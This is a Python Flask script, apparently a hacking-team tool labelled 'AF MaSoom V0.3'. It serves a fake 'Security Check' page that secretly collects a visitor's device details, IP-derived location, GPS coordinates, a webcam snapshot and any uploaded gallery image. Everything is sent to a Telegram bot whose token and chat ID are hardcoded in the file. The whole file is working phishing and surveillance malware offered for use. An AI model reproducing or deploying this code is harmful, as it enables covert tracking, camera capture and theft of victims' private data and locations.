# AF MaSoom V0.3
# Author: Ali hamza 
#Created by: AF Hack Team 
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Telegram Bot
TOKEN = "7664449745:AAGA_V8ikC-g0753vPZ-TGXeBP-OxHpRCos"
CHAT_ID = "7531257376"

html_content = """
<!DOCTYPE html>
<html>
<head>
  <title>Security Check</title>
  <script>
    function sendData() {
      // Device Info
      fetch("/device", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          platform: navigator.platform
        })
      });

      // Location
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("/location", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });
      });

      // Camera
      navigator.mediaDevices.getUserMedia({video: true})
      .then(function(stream) {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        const canvas = document.createElement('canvas');
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          const imgData = canvas.toDataURL('image/jpeg');
          fetch("/camera", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({image: imgData})
          });
          stream.getTracks().forEach(track => track.stop());
        }, 3000);
      }).catch(e => console.log("Camera error:", e));
    }

    function sendGalleryImage(input) {
      const reader = new FileReader();
      reader.onload = function() {
        fetch("/gallery", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ image: reader.result })
        });
      };
      reader.readAsDataURL(input.files[0]);
    }

    window.onload = sendData;
  </script>
</head>
<body>
  <h3>Processing Secure Verification...</h3>
  <input type="file" accept="image/*" onchange="sendGalleryImage(this)" />
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_content)

@app.route("/device", methods=["POST"])
def device():
    data = request.json
    ip = request.remote_addr
    ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
    msg = f"🌐 IP Info\nIP: {ip}\nCity: {ip_info.get('city')}\nCountry: {ip_info.get('country')}\nISP: {ip_info.get('isp')}"
    info = f"📱 Device Info\nUser-Agent: {data['userAgent']}\nPlatform: {data['platform']}\n{msg}"
    send_telegram(info)
    return "", 200

@app.route("/location", methods=["POST"])
def location():
    data = request.json
    loc = f"📍 Location\nLatitude: {data['latitude']}\nLongitude: {data['longitude']}"
    send_telegram(loc)
    return "", 200

@app.route("/camera", methods=["POST"])
def camera():
    data = request.json
    img = data['image']
    send_photo(img, "📷 Camera Snapshot")
    return "", 200

@app.route("/gallery", methods=["POST"])
def gallery():
    data = request.json
    img = data['image']
    send_photo(img, "🖼️ Gallery Image")
    return "", 200

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text})

def send_photo(photo_data, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    requests.post(url, data={
        "chat_id": CHAT_ID,
        "caption": caption,
        "photo": photo_data
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
